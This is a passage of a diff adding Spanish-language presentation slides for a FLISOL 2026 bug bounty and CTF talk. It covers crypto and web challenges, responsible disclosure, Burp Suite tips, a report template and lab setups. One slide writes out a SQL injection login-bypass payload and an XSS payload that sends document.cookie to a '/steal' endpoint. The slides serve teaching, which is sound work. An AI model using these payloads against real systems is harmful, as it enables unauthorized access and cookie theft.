+                            <div class="line"><span class="prompt">$</span> <span class="command">python3 crypto_solver.py</span></div>
+                            <div class="line"><span class="output">[+] Testing base64...</span></div>
+                            <div class="line"><span class="output">[+] Found flag: cybertax{...}</span></div>
+                            <div class="line"><span class="output">[+] Saved to flags.txt</span></div>
+                        </div>
+                    </div>
+                    <div>
+                        <div class="info-box green">
+                            <h4>✅ Metodología</h4>
+                            <ul>
+                                <li><strong>Identificar encoding</strong> — base64, hex, rot13</li>
+                                <li><strong>Decodificar progresivamente</strong> — múltiples capas</li>
+                                <li><strong>Automatizar</strong> — Python script reusable</li>
+                                <li><strong>Documentar</strong> — Writeup para el repo</li>
+                            </ul>
+                        </div>
+                        <div class="info-box" style="margin-top:0.3em">
+                            <h4>📚 Aprendido</h4>
+                            <p style="font-size:0.55em">En crypto CTFs, siempre prueba en este orden: Base64 → Hex → ROT13 → XOR → AES. Los flags suelen tener formato <code>flag{...}</code> o <code>cybertax{...}</code>.</p>
+                        </div>
+                        <div class="doom-tip" style="margin-top:0.3em"><strong>[DOOM TIP]</strong> Crea scripts genéricos en Python. Los reusarás en cada CTF.</div>
+                    </div>
+                </div>
+                <div class="doom-consejo"><strong>[DOOM]</strong> Mis soluciones de RootedCON están en GitHub. Estúdialas.</div>
+                <div class="slide-footer">
+                    <span class="footer-text">Dr. Doom: Bug Bounty | FLISOL 2026</span>
+                </div>
+            </section>
+
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 31: CTF - WEB CHALLENGE (REAL EXAMPLE)                        -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <section>
+                <h2>🌐 Challenge Web <span style="color:var(--orange)">— Inyección</span></h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Técnicas de web exploitation usadas en RootedCON.</p>
+                <div class="columns">
+                    <div>
+                        <div class="terminal" style="font-size:0.5em">
+                            <div class="line"><span class="comment"># Challenge: Bypassear login con SQLi</span></div>
+                            <div class="line"><span class="prompt">$</span> <span class="command">curl -X POST https://target/login \</span></div>
+                            <div class="line"><span class="command">  -d "username=admin' OR 1=1--&password=x"</span></div>
+                            <div class="line"><span class="output" style="color:var(--green)">✓ Login bypassed! Flag: rtcon{...}</span></div>
+                            <div class="line">&nbsp;</div>
+                            <div class="line"><span class="comment"># Challenge: XSS para steal cookie</span></div>
+                            <div class="line"><span class="prompt">$</span> <span class="command">curl "https://target/search?q=<script>fetch('/steal?c='+document.cookie)</script>"</span></div>
+                            <div class="line"><span class="output" style="color:var(--green)">✓ XSS triggered!</span></div>
+                            <div class="line">&nbsp;</div>
+                            <div class="line"><span class="comment"># Script automatizado con Python</span></div>
+                            <div class="line"><span class="prompt">$</span> <span class="command">python3 web_solver.py --target URL --technique sqli</span></div>
+                            <div class="line"><span class="output">[+] Testing SQLi payloads...</span></div>
+                            <div class="line"><span class="output">[+] Payload works: admin' OR 1=1--</span></div>
+                            <div class="line"><span class="output">[+] Flag captured!</span></div>
+                        </div>
+                    </div>
+                    <div>
+                        <div class="info-box orange">
+                            <h4>🎯 Técnicas Web Usadas</h4>
+                            <ul>
+                                <li><strong>SQL Injection</strong> — Login bypass</li>
+                                <li><strong>XSS Reflected</strong> — Cookie stealing</li>
+                                <li><strong>Directory traversal</strong> — File access</li>
+                                <li><strong>Command injection</strong> — RCE</li>
+                            </ul>
+                        </div>
+                        <div class="info-box" style="margin-top:0.3em">
+                            <h4>🛡️ Defensa</h4>
+                            <ul style="font-size:0.55em">
+                                <li>Prepared statements para SQLi</li>
+                                <li>Output encoding para XSS</li>
+                                <li>Input validation en todas partes</li>
+                                <li>WAF como capa adicional</li>
+                            </ul>
+                        </div>
+                        <div class="info-box cyan" style="margin-top:0.3em">
+                            <h4>🎓 Aplicación Docente</h4>
+                            <p style="font-size:0.55em">Como profesor en <strong>ESPE</strong>, uso estos mismos ejemplos para enseñar a mis estudiantes sobre OWASP Top 10.</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="doom-tip"><strong>[DOOM TIP]</strong> OWASP Top 10 = tu roadmap de estudio para CTFs y Bug Bounty.</div>
+                <div class="doom-consejo"><strong>[DOOM]</strong> En CTFs, explota. En Bug Bounty, reporta. La mentalidad es diferente.</div>
+                <div class="slide-footer">
+                    <span class="footer-text">Dr. Doom: Bug Bounty | FLISOL 2026</span>
+                </div>
+            </section>
+
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 33: RESPONSIBLE DISCLOSURE                                    -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <section>
+                <h2>⚖️ Responsible Disclosure <span style="color:var(--doom-gold)">— Ética Primero</span></h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">El camino correcto entre encontrar y reportar. Sin esto, todo lo demás es irrelevante.</p>
+                <div class="savitar-alert">
+                    <h4>⚠️ RECORDATORIO LEGAL — Ecuador y Latinoamérica</h4>
+                    <p>La Ley Orgánica de Protección de Datos Personales en Ecuador y leyes similares en LATAM <strong>criminalizan</strong> el acceso no autorizado a sistemas. Bug Bounty con autorización = legal. Sin autorización = <strong>delito</strong>.</p>
+                </div>
+                <div class="timeline" style="margin-top:0.3em">
+                    <div class="timeline-item" style="border-color:var(--cyan)">
+                        <h4 style="color:var(--cyan)">📋 FASE 1</h4>
+                        <p style="font-size:0.52em"><strong>Verificar Scope</strong></p>
+                        <p style="font-size:0.48em">Program policy</p>
+                        <p style="font-size:0.48em">Out of scope list</p>
+                    </div>
+                    <div class="timeline-item" style="border-color:var(--green)">
+                        <h4 style="color:var(--green)">🔍 FASE 2</h4>
+                        <p style="font-size:0.52em"><strong>Documentar</strong></p>
+                        <p style="font-size:0.48em">PoC reproducible</p>
+                        <p style="font-size:0.48em">Screenshots</p>
+                    </div>
+                    <div class="timeline-item" style="border-color:var(--orange)">
+                        <h4 style="color:var(--orange)">📝 FASE 3</h4>
+                        <p style="font-size:0.52em"><strong>Reportar</strong></p>
+                        <p style="font-size:0.48em">Vía plataforma</p>
+                        <p style="font-size:0.48em">Sin exposición pública</p>
+                    </div>
+                    <div class="timeline-item" style="border-color:var(--pink)">
+                        <h4 style="color:var(--pink)">⏳ FASE 4</h4>
+                        <p style="font-size:0.52em"><strong>Esperar</strong></p>
+                        <p style="font-size:0.48em">90 días estándar</p>
+                        <p style="font-size:0.48em">Coordinación</p>
+                    </div>
+                </div>
+                <div class="card-grid two" style="margin-top:0.3em">
+                    <div class="info-box green">
+                        <h4>✅ Timeline Responsible Disclosure</h4>
+                        <ul style="font-size:0.55em">
+                            <li><strong>Día 0:</strong> Reporte privado</li>
+                            <li><strong>1-7 días:</strong> Acknowledgment</li>
+                            <li><strong>30 días:</strong> Status update</li>
+                            <li><strong>90 días:</strong> Deadline fix (Google standard)</li>
+                            <li><strong>Post-fix:</strong> Public disclosure (opcional)</li>
+                        </ul>
+                    </div>
+                    <div class="info-box pink">
+                        <h4>❌ NUNCA hagas esto</h4>
+                        <ul style="font-size:0.55em">
+                            <li>Twitter/X antes de reportar</li>
+                            <li>Exponer datos de usuarios</li>
+                            <li>Explotar más allá del PoC</li>
+                            <li>Shared/resold vulnerability data</li>
+                            <li>Threats al equipo de seguridad</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="doom-tip"><strong>[DOOM TIP]</strong> 90 días es el estándar de Google, Microsoft, y la mayoría de programas. Respétalo.</div>
+                <div class="doom-consejo"><strong>[DOOM]</strong> Los hackers éticos son héroes anónimos. Tu reputación es tu mayor activo.</div>
+                <div class="slide-footer">
+                    <span class="footer-text">Dr. Doom: Bug Bounty | FLISOL 2026</span>
+                </div>
+            </section>
+
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 34: CTF - RESUMEN Y LECCIONES                                 -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <section>
+                <h2>🏆 CTF <span style="color:var(--doom-gold)">— Lecciones Aprendidas</span></h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">15 challenges resueltos. Lo que aprendí en RootedCON 2026.</p>
+                <div class="card-grid two" style="margin-top:0.3em">
+                    <div class="card" style="border-color:var(--green)">
+                        <h4 style="color:var(--green)">✅ Lo que SÍ funcionó</h4>
+                        <ul style="font-size:0.55em">
+                            <li>Python scripting para automatizar</li>
+                            <li>Documentar cada paso (writeups)</li>
+                            <li>Trabajar en equipo (Tailscale)</li>
+                            <li>Revisar flags anteriores de CTFs</li>
+                            <li>Criptografía: Base64 → Hex → XOR</li>
+                        </ul>
+                    </div>
+                    <div class="card" style="border-color:var(--pink)">
+                        <h4 style="color:var(--pink)">❌ Errores que cometí</h4>
+                        <ul style="font-size:0.55em">
+                            <li>Gastar tiempo en dead ends</li>
+                            <li>No verificar encoding primero</li>
+                            <li>Olvidar checkear headers HTTP</li>
+                            <li>Subestimar challenges "fáciles"</li>
+                            <li>No usar Burp Suite desde el inicio</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="info-box" style="margin-top:0.3em">
+                    <h4>📊 Mi Rendimiento RootedCON 2026</h4>
+                    <div style="display:grid; grid-template-columns: repeat(3,1fr); gap:10px; margin-top:0.2em; font-size:0.58em">
+                        <div><strong style="color:var(--green)">Crypto:</strong> 5/5 ✅</div>
+                        <div><strong style="color:var(--orange)">Web:</strong> 4/4 ✅</div>
+                        <div><strong style="color:var(--pink)">Forensics:</strong> 6/6 ✅</div>
+                    </div>
+                    <p style="margin-top:0.15em;color:var(--doom-gold)"><strong>15/15 challenges resueltos</strong> — Documentación académica para Máster UCM</p>
+                </div>
+                <div class="doom-tip"><strong>[DOOM TIP]</strong> Writeups públicos = portfolio. GitHub es tu vitrina profesional.</div>
+                <div class="doom-consejo"><strong>[DOOM]</strong> En RootedCON no solo competí — aprendí que scripting es el superpoder del bug hunter.</div>
+                <div class="slide-footer">
+                    <span class="footer-text">Dr. Doom: Bug Bounty | FLISOL 2026</span>
+                </div>
+            </section>
+
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 33: BONUS - BURP TIPS                                          -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <section>
+                <h2>🎁 Bonus <span style="color:var(--doom-gold)">— Burp Suite Tips</span></h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Trucos de Burp que Doom usa diariamente.</p>
+                <div class="card-grid two" style="margin-top:0.3em">
+                    <div class="card" style="border-color:var(--orange)">
+                        <h4 style="color:var(--orange)">🔥 Intruder Tips</h4>
+                        <ul style="font-size:0.55em">
+                            <li>Cluster bomb = múltiples payloads</li>
+                            <li>Sniper = un solo point</li>
+                            <li>Rate limiting: añadir delays</li>
+                            <li>Custom positions en grep</li>
+                        </ul>
+                    </div>
+                    <div class="card" style="border-color:var(--cyan)">
+                        <h4 style="color:var(--cyan)">⚡ Repeater Tips</h4>
+                        <ul style="font-size:0.55em">
+                            <li>Ctrl+R = enviar a Repeater</li>
+                            <li>Ctrl+Shift+R = nuevo tab</li>
+                            <li>History = undo changes</li>
+                            <li>Comparar responses</li>
+                        </ul>
+                    </div>
+                    <div class="card" style="border-color:var(--green)">
+                        <h4 style="color:var(--green)">🔍 Scanner Tips</h4>
+                        <ul style="font-size:0.55em">
+                            <li>Scope-only scanning</li>
+                            <li>Manual audit > auto scan</li>
+                            <li>Extensions: Logger++, Flow</li>
+                            <li>Save scan state</li>
+                        </ul>
+                    </div>
+                    <div class="card" style="border-color:var(--pink)">
+                        <h4 style="color:var(--pink)">🛠️ Extensions Esenciales</h4>
+                        <ul style="font-size:0.55em">
+                            <li><strong>Hackvertor</strong> — encoding</li>
+                            <li><strong>Logger++</strong> — logging</li>
+                            <li><strong>Intruder</strong> — payloads</li>
+                            <li><strong>Collaborator</strong> — OOB</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="terminal" style="margin-top:0.3em;font-size:0.55em">
+                    <div class="line"><span class="comment"># Burp shortcuts que debes conocer</span></div>
+                    <div class="line"><span class="output">Ctrl+I — Enviar a Intruder</span></div>
+                    <div class="line"><span class="output">Ctrl+R — Enviar a Repeater</span></div>
+                    <div class="line"><span class="output">Ctrl+Shift+S — Enviar a Sequencer</span></div>
+                    <div class="line"><span class="output">Ctrl+U — Decode text</span></div>
+                </div>
+                <div class="doom-tip"><strong>[DOOM TIP]</strong> Burp Pro vale cada centavo. Si no puedes pagarlo, usa Burp CE + extensions.</div>
+                <div class="doom-consejo"><strong>[DOOM]</strong> La herramienta no hace al hacker. Pero Burp hace al hacker más eficiente.</div>
+                <div class="slide-footer">
+                    <span class="footer-text">Dr. Doom: Bug Bounty | FLISOL 2026</span>
+                </div>
+            </section>
+
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 34: BONUS - REPORT TEMPLATE                                    -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <section>
+                <h2>🎁 Bonus <span style="color:var(--doom-gold)">— Report Templates</span></h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Templates profesionales que Doom usa para sus reportes.</p>
+                <div class="columns">
+                    <div>
+                        <div class="terminal" style="font-size:0.48em">
+                            <div class="line" style="color:var(--doom-gold)">══════════════════════════════════════════════</div>
+                            <div class="line" style="color:var(--orange)">[BUG BOUNTY REPORT TEMPLATE]</div>
+                            <div class="line" style="color:var(--doom-gold)">══════════════════════════════════════════════</div>
+                            <div class="line">&nbsp;</div>
+                            <div class="line"><span style="color:var(--doom-gold)">Title:</span> [Vuln Type] in [Endpoint]</div>
+                            <div class="line"><span style="color:var(--pink)">Severity:</span> [Critical/High/Medium/Low]</div>
+                            <div class="line"><span style="color:var(--cyan)">CVSS:</span> [X.X] — [Vector String]</div>
+                            <div class="line">&nbsp;</div>
+                            <div class="line"><span style="color:var(--green)">═══ SUMMARY ═══</span></div>
+                            <div class="line">[2-3 sentences describing the vulnerability]</div>
+                            <div class="line">&nbsp;</div>
+                            <div class="line"><span style="color:var(--cyan)">═══ STEPS TO REPRODUCE ═══</span></div>
+                            <div class="line">1. [First step]</div>
+                            <div class="line">2. [Second step]</div>
+                            <div class="line">3. [Third step]</div>
+                            <div class="line">&nbsp;</div>
+                            <div class="line"><span style="color:var(--orange)">═══ IMPACT ═══</span></div>
+                            <div class="line">- [Business impact 1]</div>
+                            <div class="line">- [Business impact 2]</div>
+                            <div class="line">&nbsp;</div>
+                            <div class="line"><span style="color:var(--pink)">═══ REMEDIATION ═══</span></div>
+                            <div class="line">- [Fix suggestion 1]</div>
+                            <div class="line">- [Fix suggestion 2]</div>
+                            <div class="line">&nbsp;</div>
+                            <div class="line"><span style="color:var(--green)">═══ EVIDENCE ═══</span></div>
+                            <div class="line">[Screenshots, curl commands, PoC]</div>
+                            <div class="line" style="color:var(--doom-gold)">══════════════════════════════════════════════</div>
+                        </div>
+                    </div>
+                    <div>
+                        <div class="info-box">
+                            <h4>📄 Qué incluir SIEMPRE</h4>
+                            <ul>
+                                <li><strong>Reproducible steps</strong></li>
+                                <li><strong>CVSS vector string</strong></li>
+                                <li><strong>curl commands</strong> (copy-paste ready)</li>
+                                <li><strong>Impact business-focused</strong></li>
+                                <li><strong>Remediation concreta</strong></li>
+                            </ul>
+                        </div>
+                        <div class="info-box pink" style="margin-top:0.3em">
+                            <h4>❌ Qué EVITAR</h4>
+                            <ul>
+                                <li>Vaguedades ("es vulnerable")</li>
+                                <li>Sin PoC reproducible</li>
+                                <li>Impacto exagerado</li>
+                                <li>Datos reales de usuarios</li>
+                            </ul>
+                        </div>
+                        <div class="info-box cyan" style="margin-top:0.3em">
+                            <h4>🎯 Platforms Templates</h4>
+                            <ul>
+                                <li><strong>HackerOne:</strong> Built-in template</li>
+                                <li><strong>Bugcrowd:</strong> VRT + template</li>
+                                <li><strong>Intigriti:</strong> Custom fields</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                <div class="doom-tip"><strong>[DOOM TIP]</strong> Copia este template. Personalízalo. Úsalo siempre. Consistencia = profesionalismo.</div>
+                <div class="doom-consejo"><strong>[DOOM]</strong> Tu reporte es tu firma. Que sea impecable.</div>
+                <div class="slide-footer">
+                    <span class="footer-text">Dr. Doom: Bug Bounty | FLISOL 2026</span>
+                </div>
+            </section>
+
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 35: MÁS LABORATORIOS - WebGoat                                -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <section>
+                <h2>🔬 Más Labs <span style="color:var(--cyan)">— WebGoat + SecurityShepherd</span></h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Más opciones para practicar. Doom nunca se queda sin objetivos.</p>
+                <div class="card-grid two" style="margin-top:0.3em">
+                    <div class="card" style="border-color:var(--green)">
+                        <h4 style="color:var(--green)">🐐 WebGoat (OWASP)</h4>
+                        <p style="font-size:0.55em">Plataforma educativa de OWASP</p>
+                        <ul style="font-size:0.5em">
+                            <li>100+ lecciones interactivas</li>
+                            <li>Web basics → Advanced SQLi</li>
+                            <li>Guías paso a paso</li>
+                            <li>Múltiples lenguajes</li>
+                        </ul>
+                        <div class="terminal" style="font-size:0.55em;margin-top:0.2em">
+                            <div class="line"><span class="prompt">$</span> <span class="command">docker run -p 8080:8080 webgoat/webgoat</span></div>
+                            <div class="line"><span class="output">→ localhost:8080/WebGoat</span></div>
+                        </div>
+                    </div>
+                    <div class="card" style="border-color:var(--cyan)">
+                        <h4 style="color:var(--cyan)">🛡️ Security Shepherd</h4>
+                        <p style="font-size:0.55em">CTF-style vulnerable app</p>
+                        <ul style="font-size:0.5em">
+                            <li>Modular challenge levels</li>
+                            <li>SQL Injection module</li>
+                            <li>XSS challenges</li>
+                            <li>Crypto challenges</li>
+                        </ul>
+                        <div class="terminal" style="font-size:0.55em;margin-top:0.2em">
+                            <div class="line"><span class="prompt">$</span> <span class="command">docker run -p 8443:8443 webpwnized/shepherd</span></div>
+                            <div class="line"><span class="output">→ localhost:8443</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="card-grid two" style="margin-top:0.3em">
+                    <div class="card" style="border-color:var(--orange)">
+                        <h4 style="color:var(--orange)">🐝 bWAPP</h4>
+                        <p style="font-size:0.55em">Buggy Web Application</p>
+                        <ul style="font-size:0.5em">
+                            <li>100+ vulnerabilidades</li>
+                            <li>HTML + PHP + AJAX</li>
+                            <li>Fácil de instalar</li>
+                            <li>Niveles de dificultad</li>
+                        </ul>
+                    </div>
+                    <div class="card" style="border-color:var(--pink)">
+                        <h4 style="color:var(--pink)">🎯 WebSecurityDojo</h4>
+                        <p style="font-size:0.55em">Maven Security VM</p>
+                        <ul style="font-size:0.5em">
+                            <li>Multi-target environment</li>
+                            <li>Google Gruyere</li>
+                            <li>Mutillidae II</li>
+                            <li>Tutorial included</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="doom-tip"><strong>[DOOM TIP]</strong> WebGoat es perfecto para principiantes. Guías paso a paso incluidas.</div>
+                <div class="doom-consejo"><strong>[DOOM]</strong> Practica en TODOS estos labs. Cada uno tiene bugs únicos.</div>
+                <div class="slide-footer">
+                    <span class="footer-text">Dr. Doom: Bug Bounty | FLISOL 2026</span>
+                </div>
+            </section>
+
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 36: MÁS LABORATORIOS - PLATAFORMAS                            -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <section>
+                <h2>🔬 Más Labs <span style="color:var(--green)">— Plataformas Online</span></h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Plataformas gratuitas para entrenar sin instalar nada.</p>
+                <div class="card-grid three" style="margin-top:0.3em">
+                    <div class="card" style="border-color:var(--pink)">
+                        <h4 style="color:var(--pink)">🏴‍☠️ Root Me</h4>
+                        <p style="font-size:0.55em">Plataforma francesa</p>
+                        <ul style="font-size:0.5em">
+                            <li>400+ challenges</li>
+                            <li>Web, Crypto, Forensics</li>
+                            <li>Gratuito</li>
+                            <li>Rankings globales</li>
+                        </ul>
+                        <p style="color:var(--pink);font-size:0.48em">root-me.org</p>
+                    </div>
+                    <div class="card" style="border-color:var(--cyan)">
+                        <h4 style="color:var(--cyan)">🔒 PortSwigger Academy</h4>
+                        <p style="font-size:0.55em">Web Security Academy</p>
+                        <ul style="font-size:0.5em">
+                            <li>Labs interactivos</li>
+                            <li>SQLi, XSS, SSRF, CSRF</li>
+                            <li>Certificación gratuita</li>
+                            <li>100% free</li>
+                        </ul>
+                        <p style="color:var(--cyan);font-size:0.48em">portswigger.net/web-security</p>
+                    </div>
+                    <div class="card" style="border-color:var(--orange)">
+                        <h4 style="color:var(--orange)">🎪 PicoCTF</h4>
+                        <p style="font-size:0.55em">Carnegie Mellon</p>
+                        <ul style="font-size:0.5em">
+                            <li>CTF anual</li>
+                            <li>Principiantes</li>
+                            <li>Educacional</li>
+                            <li>Archive disponible</li>
+                        </ul>
+                        <p style="color:var(--orange);font-size:0.48em">picoctf.org</p>
+                    </div>
+                </div>
+                <div class="card-grid three" style="margin-top:0.3em">
+                    <div class="card" style="border-color:var(--green)">
+                        <h4 style="color:var(--green)">🏗️ PentesterLab</h4>
+                        <p style="font-size:0.55em">Pro exercises</p>
+                        <ul style="font-size:0.5em">
+                            <li>Bootcamp track</li>
+                            <li>Android/iOS labs</li>
+                            <li>Weekly exercises</li>
+                            <li>Free tier disponible</li>
+                        </ul>
+                    </div>
+                    <div class="card" style="border-color:var(--purple)">
+                        <h4 style="color:var(--purple)">🎓 PortSwigger + HackTheBox</h4>
+                        <p style="font-size:0.55em">Combinación perfecta</p>
+                        <ul style="font-size:0.5em">
+                            <li>Academy + Labs</li>
+                            <li>Web + Network</li>
+                            <li>Cert paths</li>
+                            <li>Community</li>
+                        </ul>
+                    </div>
+                    <div class="card" style="border-color:var(--doom-gold)">
+                        <h4 style="color:var(--doom-gold)">🏆 CTFtime</h4>
+                        <p style="font-size:0.55em">Calendar de CTFs</p>
+                        <ul style="font-size:0.5em">
+                            <li>Upcoming CTFs</li>
+                            <li>Team formation</li>
+                            <li>Writeups</li>
+                            <li>Rankings</li>
+                        </ul>
+                        <p style="color:var(--doom-gold);font-size:0.48em">ctftime.org</p>
+                    </div>
+                </div>
+                <div class="doom-tip"><strong>[DOOM TIP]</strong> PortSwigger Academy es GRATIS y tiene certificación. No lo ignores.</div>
+                <div class="doom-consejo"><strong>[DOOM]</strong> La práctica hace al maestro. Únete a CTFs mensuales.</div>
+                <div class="slide-footer">
+                    <span class="footer-text">Dr. Doom: Bug Bounty | FLISOL 2026</span>
+                </div>
+            </section>
+
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 37: MÁS LABORATORIOS - SETUP COMPLETO                         -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <section>
+                <h2>🔬 Setup Completo <span style="color:var(--pink)">— Docker Compose</span></h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Todo tu laboratorio en un solo comando.</p>
+                <div class="columns">
+                    <div>
+                        <div class="terminal" style="font-size:0.5em">
+                            <div class="line"><span class="comment"># docker-compose.yml completo</span></div>
+                            <div class="line"><span class="prompt">$</span> <span class="command">cat docker-compose.yml</span></div>
+                            <div class="line"><span class="output">version: '3'</span></div>
+                            <div class="line"><span class="output">services:</span></div>
+                            <div class="line"><span class="output">  dvwa:</span></div>
+                            <div class="line"><span class="output">    image: vulnerables/web-dvwa</span></div>
+                            <div class="line"><span class="output">    ports:</span></div>
+                            <div class="line"><span class="output">      - "80:80"</span></div>
+                            <div class="line"><span class="output">  juice-shop:</span></div>
+                            <div class="line"><span class="output">    image: bkimminich/juice-shop</span></div>
+                            <div class="line"><span class="output">    ports:</span></div>
+                            <div class="line"><span class="output">      - "3000:3000"</span></div>
+                            <div class="line"><span class="output">  webgoat:</span></div>
+                            <div class="line"><span class="output">    image: webgoat/webgoat</span></div>
+                            <div class="line"><span class="output">    ports:</span></div>
+                            <div class="line"><span class="output">      - "8080:8080"</span></div>
+                            <div class="line"><span class="output">  bwapp:</span></div>
+                            <div class="line"><span class="output">    image: raesene/bwapp</span></div>
+                            <div class="line"><span class="output">    ports:</span></div>
+                            <div class="line"><span class="output">      - "8081:80"</span></div>
+                        </div>
+                    </div>
+                    <div>
+                        <div class="info-box">
+                            <h4>🚀 Iniciar todo</h4>
+                            <div class="terminal" style="font-size:0.55em">
+                                <div class="line"><span class="prompt">$</span> <span class="command">docker compose up -d</span></div>
+                                <div class="line"><span class="output">✓ 4 services started</span></div>
+                                <div class="line">&nbsp;</div>
+                                <div class="line"><span class="prompt">$</span> <span class="command">docker compose ps</span></div>
+                                <div class="line"><span class="output">dvwa      Up  :80</span></div>
+                                <div class="line"><span class="output">juice     Up  :3000</span></div>
+                                <div class="line"><span class="output">webgoat   Up  :8080</span></div>
+                                <div class="line"><span class="output">bwapp     Up  :8081</span></div>
+                            </div>
+                        </div>
+                        <div class="info-box cyan" style="margin-top:0.3em">
+                            <h4>🔗 URLs de Acceso</h4>
+                            <ul style="font-size:0.58em">
+                                <li><strong>DVWA:</strong> localhost:80</li>
+                                <li><strong>Juice Shop:</strong> localhost:3000</li>
+                                <li><strong>WebGoat:</strong> localhost:8080/WebGoat</li>
+                                <li><strong>bWAPP:</strong> localhost:8081/bWAPP</li>
+                            </ul>
+                        </div>
+                        <div class="doom-tip" style="margin-top:0.3em"><strong>[DOOM TIP]</strong> Un solo comando = 4 labs. Doom es eficiente.</div>
+                    </div>
+                </div>
+                <div class="doom-consejo"><strong>[DOOM]</strong> Guarda este docker-compose en un repo. Úsalo siempre que necesites practicar.</div>
+                <div class="slide-footer">
+                    <span class="footer-text">Dr. Doom: Bug Bounty | FLISOL 2026</span>
+                </div>
+            </section>
+
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 38: GRACIAS                                                    -->
             <!-- ═══════════════════════════════════════════════════════════════════ -->
             <section class="thanks-slide">
                 <h1>¡Gracias!</h1>
